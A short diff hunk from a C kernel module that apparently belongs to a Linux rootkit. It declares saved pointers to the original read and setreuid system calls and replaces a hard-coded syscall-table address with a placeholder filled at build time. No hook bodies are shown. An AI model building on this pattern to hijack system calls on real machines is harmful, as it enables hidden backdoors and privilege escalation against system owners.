@@ -25,7 +25,7 @@ typedef unsigned long psize;
 asmlinkage int (*o_read)(int fd, void* buf, size_t count);
 
 // "table" will be replaced with the system call table address found by grep in compile.sh
-psize *sys_call_table = (psize*)0xffffffff816002e0;
+psize *sys_call_table = (psize*)0xTABLE;
 
 asmlinkage long (*o_setreuid) (uid_t ruid, uid_t reuid);
 
